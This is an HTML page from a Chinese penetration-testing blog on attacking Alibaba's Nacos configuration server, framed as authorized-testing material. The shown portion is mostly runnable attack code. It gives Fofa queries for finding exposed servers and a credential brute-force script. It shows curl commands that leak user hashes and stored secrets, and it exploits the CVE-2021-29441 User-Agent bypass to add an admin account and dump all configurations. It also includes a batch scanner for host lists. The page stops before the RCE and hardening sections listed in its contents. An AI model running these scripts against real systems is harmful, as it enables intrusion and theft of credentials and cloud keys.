@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="免责声明本文所述技术仅供安全研究、授权测试及防御学习使用。未经授权对他人系统进行测试属于违法行为。读者应遵守《网络安全法》及相关法律法规，因不当使用本文内容造成的任何后果，作者不承担法律责任。 引言Nacos 是阿里巴巴开源的服务发现与配置管理中间件，在微服务架构中被广泛部署。由于默认配置不当、历史漏洞缺乏修复等问题，Nacos 常年处于攻防对抗的高频目标之列。本文从渗透测试角度，系统梳理 Nac">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Nacos安全测试">
+<meta property="og:url" content="https://congliang.github.io/Framework-Nacos-security/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="免责声明本文所述技术仅供安全研究、授权测试及防御学习使用。未经授权对他人系统进行测试属于违法行为。读者应遵守《网络安全法》及相关法律法规，因不当使用本文内容造成的任何后果，作者不承担法律责任。 引言Nacos 是阿里巴巴开源的服务发现与配置管理中间件，在微服务架构中被广泛部署。由于默认配置不当、历史漏洞缺乏修复等问题，Nacos 常年处于攻防对抗的高频目标之列。本文从渗透测试角度，系统梳理 Nac">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-04-10T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:34:45.880Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="云安全">
+<meta property="article:tag" content="框架安全">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/Framework-Nacos-security/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/Framework-Nacos-security/","path":"Framework-Nacos-security/","title":"Nacos安全测试"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Nacos安全测试 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"><span class="nav-number">1.</span> <span class="nav-text">免责声明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%95%E8%A8%80"><span class="nav-number">2.</span> <span class="nav-text">引言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E6%8E%A2%E6%B5%8B%E4%B8%8E%E7%89%88%E6%9C%AC%E8%AF%86%E5%88%AB"><span class="nav-number">3.</span> <span class="nav-text">一、环境探测与版本识别</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E9%BB%98%E8%AE%A4%E5%87%AD%E8%AF%81-nacos-nacos"><span class="nav-number">4.</span> <span class="nav-text">二、默认凭证 nacos&#x2F;nacos</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81"><span class="nav-number">4.1.</span> <span class="nav-text">登录验证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4%E8%84%9A%E6%9C%AC"><span class="nav-number">4.2.</span> <span class="nav-text">弱口令爆破脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="nav-number">5.</span> <span class="nav-text">三、未授权访问</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%A8%E6%88%B7%E5%88%97%E8%A1%A8%E6%B3%84%E6%BC%8F"><span class="nav-number">5.1.</span> <span class="nav-text">用户列表泄漏</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F"><span class="nav-number">5.2.</span> <span class="nav-text">配置信息泄漏</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81CVE-2021-29441-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87"><span class="nav-number">6.</span> <span class="nav-text">四、CVE-2021-29441 身份验证绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">6.1.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-number">6.2.</span> <span class="nav-text">利用方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8B%E8%84%9A%E6%9C%AC"><span class="nav-number">6.3.</span> <span class="nav-text">批量检测脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4%E6%94%BB%E5%87%BB%E9%93%BE"><span class="nav-number">6.4.</span> <span class="nav-text">完整攻击链</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81User-Agent-Header-%E7%BB%95%E8%BF%87%E5%8F%98%E4%BD%93"><span class="nav-number">7.</span> <span class="nav-text">五、User-Agent Header 绕过变体</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81Nacos-RCE-via-Derby"><span class="nav-number">8.</span> <span class="nav-text">六、Nacos RCE via Derby</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Derby-SQL-%E6%B3%A8%E5%85%A5"><span class="nav-number">8.1.</span> <span class="nav-text">Derby SQL 注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-Derby-%E5%86%85%E7%BD%AE%E8%BF%87%E7%A8%8B%E5%86%99%E6%96%87%E4%BB%B6%E5%AE%9E%E7%8E%B0-RCE"><span class="nav-number">8.2.</span> <span class="nav-text">利用 Derby 内置过程写文件实现 RCE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%BC%E5%90%88%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC"><span class="nav-number">8.3.</span> <span class="nav-text">综合攻击脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E3%80%81%E9%85%8D%E7%BD%AE%E6%B3%84%E6%BC%8F%E5%90%8E%E7%9A%84%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="nav-number">9.</span> <span class="nav-text">七、配置泄漏后的横向移动</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AB%E3%80%81%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA%E5%BB%BA%E8%AE%AE"><span class="nav-number">10.</span> <span class="nav-text">八、安全加固建议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">11.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">12.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Framework-Nacos-security/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Nacos安全测试 | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Nacos安全测试
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-04-10 08:00:00" itemprop="dateCreated datePublished" datetime="2026-04-10T08:00:00+08:00">2026-04-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>本文所述技术仅供安全研究、授权测试及防御学习使用。未经授权对他人系统进行测试属于违法行为。读者应遵守《网络安全法》及相关法律法规，因不当使用本文内容造成的任何后果，作者不承担法律责任。</p>
+<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>Nacos 是阿里巴巴开源的服务发现与配置管理中间件，在微服务架构中被广泛部署。由于默认配置不当、历史漏洞缺乏修复等问题，Nacos 常年处于攻防对抗的高频目标之列。本文从渗透测试角度，系统梳理 Nacos 常见的安全风险及利用方式。</p>
+<h2 id="一、环境探测与版本识别"><a href="#一、环境探测与版本识别" class="headerlink" title="一、环境探测与版本识别"></a>一、环境探测与版本识别</h2><p>Nacos 默认运行在 8848 端口。Fofa 等资产测绘平台可通过以下语法批量发现：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app=&quot;NACOS&quot; &amp;&amp; port=&quot;8848&quot;</span><br><span class="line">title=&quot;Nacos&quot;</span><br></pre></td></tr></table></figure>
+
+<p>获取版本信息的接口：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://target:8848/nacos/v1/console/server/state</span><br></pre></td></tr></table></figure>
+
+<p>返回 JSON 中包含 <code>version</code> 和 <code>standalone_mode</code> 字段。standalone 模式代表使用内置 Derby 数据库，这是后续攻击的重要前提。</p>
+<h2 id="二、默认凭证-nacos-nacos"><a href="#二、默认凭证-nacos-nacos" class="headerlink" title="二、默认凭证 nacos&#x2F;nacos"></a>二、默认凭证 nacos&#x2F;nacos</h2><p>Nacos 默认管理员账户为 <code>nacos/nacos</code>，早期版本无强制修改密码机制，大量生产环境直接沿用默认凭证。</p>
+<h3 id="登录验证"><a href="#登录验证" class="headerlink" title="登录验证"></a>登录验证</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST <span class="string">&#x27;http://target:8848/nacos/v1/auth/login&#x27;</span> \</span><br><span class="line">  -d <span class="string">&#x27;username=nacos&amp;password=nacos&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>响应中返回 <code>accessToken</code> 即登录成功，之后所有请求的 Authorization Header 携带 <code>Bearer {accessToken}</code> 即可维持会话。</p>
+<h3 id="弱口令爆破脚本"><a href="#弱口令爆破脚本" class="headerlink" title="弱口令爆破脚本"></a>弱口令爆破脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">TARGET = <span class="string">&quot;http://192.168.1.100:8848&quot;</span></span><br><span class="line">URL = <span class="string">f&quot;<span class="subst">&#123;TARGET&#125;</span>/nacos/v1/auth/login&quot;</span></span><br><span class="line"></span><br><span class="line">users = [<span class="string">&quot;nacos&quot;</span>, <span class="string">&quot;admin&quot;</span>]</span><br><span class="line">passwords = [<span class="string">&quot;nacos&quot;</span>, <span class="string">&quot;admin123&quot;</span>, <span class="string">&quot;Nacos@123&quot;</span>, <span class="string">&quot;nacos123&quot;</span>, <span class="string">&quot;123456&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> u <span class="keyword">in</span> users:</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> passwords:</span><br><span class="line">        r = requests.post(URL, data=&#123;<span class="string">&quot;username&quot;</span>: u, <span class="string">&quot;password&quot;</span>: p&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;accessToken&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] Found: <span class="subst">&#123;u&#125;</span>:<span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;    Token: <span class="subst">&#123;r.json()[<span class="string">&#x27;accessToken&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="三、未授权访问"><a href="#三、未授权访问" class="headerlink" title="三、未授权访问"></a>三、未授权访问</h2><p>Nacos 多项核心 API 在未配置认证时可直接访问，这是最常见的暴露面。</p>
+<h3 id="用户列表泄漏"><a href="#用户列表泄漏" class="headerlink" title="用户列表泄漏"></a>用户列表泄漏</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://target:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=10&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>返回所有用户名及 BCrypt 密文密码，可用于离线爆破和用户枚举。</p>
+<h3 id="配置信息泄漏"><a href="#配置信息泄漏" class="headerlink" title="配置信息泄漏"></a>配置信息泄漏</h3><p>Nacos 作为配置中心存储着数据库连接串、Redis 密码、各类云服务 AK&#x2F;SK 等敏感信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出命名空间</span></span><br><span class="line">curl <span class="string">&#x27;http://target:8848/nacos/v1/console/namespaces&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出所有配置</span></span><br><span class="line">curl <span class="string">&#x27;http://target:8848/nacos/v1/cs/configs?pageNo=1&amp;pageSize=500&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取指定配置</span></span><br><span class="line">curl <span class="string">&#x27;http://target:8848/nacos/v1/cs/configs?dataId=application.yml&amp;group=DEFAULT_GROUP&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>常见泄漏内容：</p>
+<ul>
+<li>JDBC 连接字符串（含数据库账号密码）</li>
+<li>Redis 连接密码</li>
+<li>OSS &#x2F; SMS &#x2F; MQ 等云服务 AK&#x2F;SK</li>
+<li>第三方 API 密钥及证书私钥</li>
+</ul>
+<h2 id="四、CVE-2021-29441-身份验证绕过"><a href="#四、CVE-2021-29441-身份验证绕过" class="headerlink" title="四、CVE-2021-29441 身份验证绕过"></a>四、CVE-2021-29441 身份验证绕过</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>影响版本：Nacos &lt;&#x3D; 1.4.1。<code>com.alibaba.nacos.auth.AuthFilter</code> 中对 User-Agent 进行白名单校验，若请求头以 <code>Nacos-Server</code> 开头，则判定为服务端内部请求，直接跳过认证过滤器：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">agent</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;User-Agent&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (agent != <span class="literal">null</span> &amp;&amp; agent.startsWith(<span class="string">&quot;Nacos-Server&quot;</span>)) &#123;</span><br><span class="line">    chain.doFilter(request, response);  <span class="comment">// 跳过认证</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 无需认证直接添加管理员用户</span></span><br><span class="line">curl -X POST <span class="string">&#x27;http://target:8848/nacos/v1/auth/users&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;User-Agent: Nacos-Server&#x27;</span> \</span><br><span class="line">  -d <span class="string">&#x27;username=hacker&amp;password=hacker123&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 无需认证读取所有配置</span></span><br><span class="line">curl <span class="string">&#x27;http://target:8848/nacos/v1/cs/configs?pageNo=1&amp;pageSize=999&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;User-Agent: Nacos-Server&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="批量检测脚本"><a href="#批量检测脚本" class="headerlink" title="批量检测脚本"></a>批量检测脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">host</span>):</span><br><span class="line">    url = <span class="string">f&quot;http://<span class="subst">&#123;host&#125;</span>:8848/nacos/v1/auth/users&quot;</span></span><br><span class="line">    r = requests.get(url, headers=&#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Nacos-Server&quot;</span>&#125;, timeout=<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">return</span> r.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&quot;pageItems&quot;</span> <span class="keyword">in</span> r.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(sys.argv[<span class="number">1</span>]) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        h = line.strip()</span><br><span class="line">        <span class="keyword">if</span> check(h):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[VULN] <span class="subst">&#123;h&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="完整攻击链"><a href="#完整攻击链" class="headerlink" title="完整攻击链"></a>完整攻击链</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 添加用户</span></span><br><span class="line">curl -X POST <span class="string">&#x27;http://target:8848/nacos/v1/auth/users&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;User-Agent: Nacos-Server&#x27;</span> \</span><br><span class="line">  -d <span class="string">&#x27;username=test&amp;password=Test@123&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 获取命名空间</span></span><br><span class="line">curl <span class="string">&#x27;http://target:8848/nacos/v1/console/namespaces&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;User-Agent: Nacos-Server&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 遍历读取所有配置</span></span><br><span class="line">curl <span class="string">&#x27;http://target:8848/nacos/v1/cs/configs?pageNo=1&amp;pageSize=500&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;User-Agent: Nacos-Server&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 逐个获取配置详情</span></span><br><span class="line"><span class="keyword">for</span> tid <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;tenants[@]&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">  curl <span class="string">&quot;http://target:8848/nacos/v1/cs/configs?dataId=&amp;group=DEFAULT_GROUP&amp;tenant=<span class="variable">$&#123;tid&#125;</span>&quot;</span> \</span><br><span class="line">    -H <span class="string">&#x27;User-Agent: Nacos-Server&#x27;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="五、User-Agent-Header-绕过变体"><a href="#五、User-Agent-Header-绕过变体" class="headerlink" title="五、User-Agent Header 绕过变体"></a>五、User-Agent Header 绕过变体</h2><p>除 <code>Nacos-Server</code> 外，不同版本的白名单机制可能存在差异，以下变体值得尝试：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">&#x27;User-Agent: Nacos-Server&#x27;</span>   http://target:8848/nacos/v1/cs/configs</span><br><span class="line">curl -H <span class="string">&#x27;User-Agent: Nacos-Client&#x27;</span>   http://target:8848/nacos/v1/cs/configs</span><br><span class="line">curl -H <span class="string">&#x27;User-Agent: nacos-server&#x27;</span>   http://target:8848/nacos/v1/cs/configs</span><br></pre></td></tr></table></figure>
+
+<p>部分未纳入认证拦截器的路径同样可被未授权访问：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/nacos/v1/cs/ops/derby</span><br><span class="line">/nacos/v1/ns/operator/servers</span><br><span class="line">/nacos/v1/ns/upgrade/ops/metrics</span><br></pre></td></tr></table></figure>
+
+<p>多路径多 UA 组合探测脚本：</p>
